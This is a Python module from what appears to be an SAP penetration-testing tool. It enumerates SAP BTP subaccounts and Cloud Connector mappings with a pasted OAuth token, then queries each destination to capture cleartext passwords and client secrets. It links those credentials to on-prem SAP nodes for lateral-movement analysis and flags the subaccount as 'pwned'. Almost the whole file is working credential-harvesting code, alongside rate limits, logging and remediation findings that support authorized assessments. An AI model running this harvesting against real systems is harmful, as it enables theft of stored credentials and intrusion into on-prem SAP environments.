#!/usr/bin/env python3
"""SAP BTP — subaccount + destination enumeration via cf oauth-token.

The single biggest BTP risk is **stored cleartext credentials** in
destinations that point at on-prem SAP systems.  When the operator's
token has the ``destination_configuration.ApiAccess`` scope, BTP's
Destination Service returns the password in cleartext for every flow
that has one (Basic, OAuth2Password, OAuth2ClientCredentials,
OAuth2SAMLBearerAssertion).  This module pulls that data, captures
the cleartext, and links each destination back to the on-prem
SAPNode it targets so the existing trust-chain analyser walks the
new edge automatically.

Operational safety guarantees:
  * The token is NEVER persisted to disk.  It lives in
    SAPMAPApi-bound state on the running process and is wiped on exit.
  * Every BTP API call is rate-limited (max ~1 req / 100 ms,
    hard-cap 200 req / minute / token) so a typo can't hammer a
    customer's production cloud control plane.
  * Every outbound URL is logged to the SAPMAP console — operators
    can audit every request against their engagement scope.
  * No automatic polling.  Every API hit is operator-triggered via
    an explicit GUI action.

Region handling: a `cf oauth-token` is region-scoped — the token
itself encodes which region's API endpoints it can hit, so we don't
guess the region from SCC fingerprints.  The token's `iss` claim
reveals the API host (e.g. `https://api.authentication.eu10.hana
.ondemand.com/oauth/token`); we strip the region from there.
"""
from __future__ import annotations

import base64
import json
import logging
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from typing import Optional, Tuple

from sapmap_models import (
    BTPSubaccountNode, BTPDestination, RFCConnection, SAPMAPState,
    Credentials, Finding, Severity,
)
from sapmap_errors import format_rfc_exception

logger = logging.getLogger(__name__)


_UA = "SAPMAP/1.0 (+btp-enum)"

# Rate limit: 1 request per 100 ms, hard cap 200 / min.  Tracked per
# token in a module-level dict.  Operator can clear by switching tokens.
_RATE_LIMIT_BUCKETS: dict = {}    # token_fp -> [(ts, ts, ts...), ...]


def _rate_limit_check(token_fp: str) -> Optional[str]:
    """Return None if the call is allowed, or a string explaining why
    the rate-limit fired.  Slides a 60-second window."""
    now = time.monotonic()
    bucket = _RATE_LIMIT_BUCKETS.setdefault(token_fp, [])
    bucket[:] = [t for t in bucket if now - t < 60.0]
    if len(bucket) >= 200:
        return ("hard-cap reached: 200 req/min for this token — refusing "
                "to make further calls.  This usually means a logic bug in "
                "SAPMAP, not a real workload.")
    if bucket and now - bucket[-1] < 0.1:
        time.sleep(0.1 - (now - bucket[-1]))
    bucket.append(time.monotonic())
    return None


def _token_fingerprint(token: str) -> str:
    """8-char SHA-truncate of the token — used as an opaque cache key
    that can safely appear in logs / state without leaking the token."""
    import hashlib
    return hashlib.sha256(token.encode()).hexdigest()[:8]


# ---------------------------------------------------------------------------
# Token decoding — pulls region + identity claims out of a JWT
# ---------------------------------------------------------------------------

def decode_token_claims(token: str) -> dict:
    """Parse the JWT, return the payload claims as a dict.

    Pure offline operation — no signature verification (we trust the
    operator pasted a real token).  Returns ``{}`` on parse failure.
    """
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        payload = parts[1]
        # urlsafe_b64decode requires correct padding
        padding = "=" * (-len(payload) % 4)
        raw = base64.urlsafe_b64decode(payload + padding)
        return json.loads(raw)
    except Exception:
        return {}


def extract_region_from_token(token: str) -> str:
    """Extract the BTP region (eu10, us10, ap10, …) from the token's
    `iss` claim.

    Example iss: ``https://api.authentication.eu10.hana.ondemand.com/oauth/token``
    Returns ``"eu10"`` for the example, or ``""`` if the format isn't
    recognised."""
    claims = decode_token_claims(token)
    iss = claims.get("iss") or claims.get("issuer") or ""
    m = re.search(
        r"(?:authentication|api)\.([a-z0-9]+)\.hana\.ondemand\.com",
        iss
    )
    return m.group(1) if m else ""


# ---------------------------------------------------------------------------
# HTTP helper — rate-limited, logged, JSON-decoding
# ---------------------------------------------------------------------------

def _btp_get(url: str, token: str, *,
              token_fp: Optional[str] = None,
              timeout: float = 12.0,
              accept: str = "application/json") -> Tuple[int, dict, bytes]:
    """GET ``url`` with the bearer token.  Returns (status, headers_dict, body_bytes).

    HTTPError is captured (its body is returned alongside the error code)
    so callers can inspect 401 / 403 messages.  Network errors raise.
    """
    fp = token_fp or _token_fingerprint(token)
    rl = _rate_limit_check(fp)
    if rl:
        raise RuntimeError(f"rate limit: {rl}")
    print(f"[*] BTP[{fp}] GET {url}")
    req = urllib.request.Request(url, headers={
        "Authorization": f"Bearer {token}",
        "Accept": accept,
        "User-Agent": _UA,
    })
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read()
            return (r.status, dict(r.headers), body)
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
        except Exception:
            body = b""
        return (e.code, dict(e.headers or {}), body)


def _json_or_none(body: bytes):
    try:
        return json.loads(body.decode("utf-8", errors="replace"))
    except Exception:
        return None


# ---------------------------------------------------------------------------
# API: subaccount enumeration + destinations dump
# ---------------------------------------------------------------------------

# BTP regions that Cloud Foundry / Connectivity APIs are reachable on.
# The pattern is consistent: api.cf.<region>.hana.ondemand.com plus
# destination-configuration.cfapps.<region>.hana.ondemand.com .
_REGION_RE = re.compile(r"^[a-z]{2,3}\d{1,3}$")


def _api_root(region: str) -> str:
    if not _REGION_RE.match(region):
        raise ValueError(f"Refusing to build URL for unknown region {region!r}")
    return f"https://api.cf.{region}.hana.ondemand.com"


def _destinations_root(region: str) -> str:
    if not _REGION_RE.match(region):
        raise ValueError(f"Refusing to build URL for unknown region {region!r}")
    # NB: this is the destination-configuration "find" endpoint that
    # returns all destinations for a subaccount when called with a
    # subaccount-scoped token.  Single-destination retrieval uses
    # /destination-configuration/v1/destinations/<name> .
    return (f"https://destination-configuration.cfapps.{region}"
            f".hana.ondemand.com/destination-configuration/v1")


def validate_token(token: str) -> dict:
    """Decode the JWT and return a summary suitable for the GUI:
    region, identity, expiry, scopes.  Pure offline — no network.
    """
    claims = decode_token_claims(token)
    if not claims:
        return {"ok": False, "error": "could not decode JWT — token likely truncated or malformed"}
    region = extract_region_from_token(token)
    exp = claims.get("exp", 0) or 0
    expires_in = int(exp - time.time()) if exp else 0
    return {
        "ok":       True,
        "region":   region or "(unknown)",
        "user":     (claims.get("user_name") or claims.get("preferred_username")
                      or claims.get("sub") or ""),
        "email":    claims.get("email", ""),
        "scopes":   list(claims.get("scope") or claims.get("scopes") or []),
        "issuer":   claims.get("iss", ""),
        "audience": claims.get("aud", ""),
        "expires_in_seconds": expires_in,
        "expired":  expires_in <= 0,
        "fingerprint": _token_fingerprint(token),
    }


def enumerate_subaccounts(token: str, region: str) -> list:
    """List every subaccount the token's user can reach.

    Returns a list of dicts: {uuid, display_name, subdomain,
    parent_global_account, region}.  Empty list on auth failure.
    """
    if not region or not _REGION_RE.match(region):
        return []
    url = f"{_api_root(region)}/v1/accounts/subaccounts"
    code, _hdrs, body = _btp_get(url, token)
    if code == 200:
        data = _json_or_none(body) or {}
        items = data.get("value") or data.get("subaccounts") or []
        out = []
        for it in items:
            out.append({
                "uuid":         (it.get("guid") or it.get("subaccountId")
                                  or it.get("uuid") or ""),
                "display_name": (it.get("displayName") or it.get("name")
                                  or ""),
                "subdomain":    it.get("subdomain", ""),
                "parent_global_account": (it.get("globalAccountGUID")
                                            or it.get("parentGuid") or ""),
                "region":       it.get("region") or region,
            })
        return out
    print(f"[-] BTP enumerate_subaccounts: HTTP {code} — token may lack "
          f"global-account-or-subaccount viewer scope")
    return []


def pull_scc_mappings(token: str, region: str) -> list:
    """List every Cloud Connector tunnel registered with the
    subaccounts this token reaches.

    Returns: [{location_id, scc_host_uuid, subaccount_uuid, version, ...}]
    """
    if not region or not _REGION_RE.match(region):
        return []
    url = f"{_api_root(region)}/connectivity/v1/cloudConnectorMappings"
    code, _hdrs, body = _btp_get(url, token)
    if code != 200:
        return []
    data = _json_or_none(body) or {}
    items = data.get("value") or data.get("mappings") or []
    out = []
    for it in items:
        out.append({
            "location_id":      it.get("locationId", ""),
            "scc_host_uuid":    it.get("sccUuid") or it.get("connectorUuid", ""),
            "subaccount_uuid":  it.get("subaccount") or it.get("subaccountGuid", ""),
            "version":          it.get("version", ""),
        })
    return out


def pull_destinations(token: str, region: str,
                       subaccount_uuid: str) -> Tuple[list, str]:
    """List + capture cleartext for every destination in the subaccount.

    Returns ``(destinations, error)`` — destinations is a list of
    BTPDestination instances (cleartext password populated where the
    API returned one), error is a non-empty string when the call
    failed (auth, rate-limit, etc.).

    Implementation note: the listing endpoint
    ``/subaccountDestinations`` returns metadata WITHOUT cleartext.
    To get the password we have to call the **find** endpoint
    ``/destinations/<name>`` per destination — that endpoint
    materialises the password when the token has
    ``destination_configuration.ApiAccess``.  We dedupe these calls
    via the rate-limit and surface a per-destination cleartext flag.
    """
    if not region or not _REGION_RE.match(region):
        return [], "unsupported region"
    if not subaccount_uuid:
        return [], "subaccount_uuid required"

    list_url = f"{_destinations_root(region)}/subaccountDestinations"
    code, _hdrs, body = _btp_get(list_url, token)
    if code != 200:
        return [], (f"listing failed: HTTP {code} — body[:200]="
                    f"{body[:200]!r}")
    listing = _json_or_none(body) or []
    if isinstance(listing, dict):
        listing = listing.get("value", []) or []

    out = []
    now_iso = datetime.now().isoformat()
    for entry in listing:
        if not isinstance(entry, dict):
            continue
        name = entry.get("Name") or entry.get("name") or ""
        if not name:
            continue
        # Per-destination "find" call exposes cleartext for
        # Basic/OAuth2Password/etc when ApiAccess scope is present.
        find_url = (f"{_destinations_root(region)}/destinations/"
                    + urllib.parse.quote(name, safe=""))
        d_code, _, d_body = _btp_get(find_url, token)
        full = _json_or_none(d_body) if d_code == 200 else None
        cfg = (full.get("destinationConfiguration", {})
                if isinstance(full, dict) else
                entry)

        auth = (cfg.get("Authentication") or cfg.get("authentication") or "")
        user = (cfg.get("User") or cfg.get("user") or
                cfg.get("clientId") or cfg.get("ClientId") or "")
        # Cleartext password — present for Basic / OAuth2Password
        # when ApiAccess scope is granted.  Null / missing otherwise.
        password = (cfg.get("Password") or cfg.get("password")
                     or cfg.get("clientSecret")
                     or cfg.get("ClientSecret") or "")
        cleartext = bool(password)

        # Strip well-known cleartext-bearing keys from the
        # additional_properties payload so we don't double-store.
        skip = {
            "Name", "Type", "URL", "ProxyType", "Authentication",
            "User", "Password", "clientSecret", "ClientSecret",
            "name", "type", "url", "proxyType", "authentication",
            "user", "password", "Description", "description",
        }
        additional = {k: v for k, v in cfg.items() if k not in skip}

        d = BTPDestination(
            subaccount_uuid=subaccount_uuid,
            name=name,
            type=(cfg.get("Type") or cfg.get("type") or "HTTP"),
            url=(cfg.get("URL") or cfg.get("url") or ""),
            proxy_type=(cfg.get("ProxyType") or cfg.get("proxyType") or ""),
            authentication=auth,
            user=user,
            password=password,
            cleartext_captured=cleartext,
            description=(cfg.get("Description") or cfg.get("description") or ""),
            additional_properties=additional,
            captured_at=now_iso,
        )
        out.append(d)
    return out, ""


# ---------------------------------------------------------------------------
# Map integration: link captured destinations to on-prem SAPNodes
# ---------------------------------------------------------------------------

def _hostname_in_url(url: str) -> str:
    """Pull the hostname out of an http(s):// URL or an RFC ashost
    style string.  Returns "" on parse failure."""
    if not url:
        return ""
    try:
        if url.startswith(("http://", "https://")):
            return urllib.parse.urlparse(url).hostname or ""
        # Bare host:port style (RFC destinations)
        return url.split(":", 1)[0]
    except Exception:
        return ""


def link_destinations_to_onprem(state: SAPMAPState,
                                  subaccount: BTPSubaccountNode) -> int:
    """For every destination on the subaccount with a captured
    cleartext password, find the matching on-prem SAPNode (by IP /
    hostname) and:

      1. Append the (user, password) to that SAPNode.credentials so
         later RFC operations / propagation pick them up.
      2. Add a synthetic RFCConnection from a sentinel "BTP:<uuid>"
         source to the target SID with the captured user.  Marked
         tested=False so the trust-chain analyser walks it but
         flags it UNTESTED.
      3. Annotate the destination's linked_target_sid for the GUI.

    Returns the number of credentials newly linked.

    No live SAP traffic — pure structural state mutation.
    """
    linked = 0
    for d in subaccount.destinations or []:
        if not isinstance(d, BTPDestination):
            d = BTPDestination.from_dict(d)
        if not d.url:
            continue
        target_host = _hostname_in_url(d.url).lower()
        if not target_host:
            continue
        # Find the SAPNode by IP / hostname / FQDN short form
        match_sid = ""
        match_via = ""
        for sid, node in state.nodes.items():
            ips = {(node.ip or "").lower()}
            names = {(node.hostname or "").lower()}
            if "." in (node.hostname or ""):
                names.add(node.hostname.split(".", 1)[0].lower())
            if target_host in ips:
                match_sid, match_via = sid, "ip"
                break
            if target_host in names:
                match_sid, match_via = sid, "hostname"
                break
        if not match_sid:
            continue
        d.linked_target_sid = match_sid
        d.linked_via = match_via

        target = state.nodes[match_sid]
        # Push captured creds onto the target node — dedupe by
        # (username, password) so re-runs don't duplicate.
        if d.cleartext_captured and d.user and d.password:
            already = any(
                c.username == d.user and c.password == d.password
                for c in (target.credentials or []))
            if not already:
                target.credentials.append(Credentials(
                    username=d.user, password=d.password,
                    client="000", verified=False,
                ))
                linked += 1
                # Also drop a finding on the target SAPNode so the
                # report explains where these creds came from.
                target.findings.append(Finding(
                    name="BTP destination leaked on-prem credential",
                    severity=Severity.CRITICAL,
                    description=(
                        f"BTP subaccount {subaccount.uuid} stored a "
                        f"{d.authentication} destination ({d.name}) "
                        f"with cleartext on-prem credentials for user "
                        f"{d.user}.  Anyone with a "
                        f"`destination_configuration.ApiAccess`-scoped "
                        f"token in that subaccount can retrieve this "
                        f"password and log on directly to {match_sid}."
                    ),
                    remediation=(
                        f"Replace stored Basic / OAuth2Password "
                        f"credentials in BTP destination {d.name} with "
                        f"Principal Propagation (X.509 mTLS to SCC) or "
                        f"OAuth2SAMLBearerAssertion against IAS.  Audit "
                        f"every BTP user with the "
                        f"`destination_configuration.ApiAccess` scope; "
                        f"this scope is per-subaccount admin-equivalent.  "
                        f"Rotate the leaked password ({d.user}) and "
                        f"audit USR02 last-login history for activity "
                        f"outside the engagement window."
                    ),
                    detail=(f"BTP→{match_sid} via destination {d.name} "
                             f"({d.url})"),
                ))
                target.has_critical_finding = True

        # Synthetic edge from BTP subaccount → SAP node so the
        # trust-chain analyser includes the BTP→on-prem hop.  We use
        # a sentinel source_sid prefix "BTP:" to keep the BTP topology
        # distinct from regular RFC edges.
        synthetic_dest = f"BTP:{subaccount.uuid[:8]}::{d.name}"
        if not any(c.destination_name == synthetic_dest
                   for c in state.connections):
            state.connections.append(RFCConnection(
                source_sid=f"BTP:{subaccount.uuid[:8]}",
                source_host=subaccount.subdomain or subaccount.uuid,
                target_sid=match_sid,
                target_host=target_host,
                destination_name=synthetic_dest,
                rfc_user=d.user,
                client="000",
                conn_type="http" if d.url.startswith("http") else "rfc",
                http_url=d.url if d.url.startswith("http") else "",
                http_auth_type=d.authentication,
                tested=False,
                logon_successful=False,
                # has_sap_all = unknown until tested; default False
                has_sap_all=False,
                secstore_password=d.password,
            ))
    if linked:
        # Mark the BTP subaccount as pwned — at least one cleartext
        # credential to a known on-prem system was captured.
        subaccount.pwned = True
    return linked
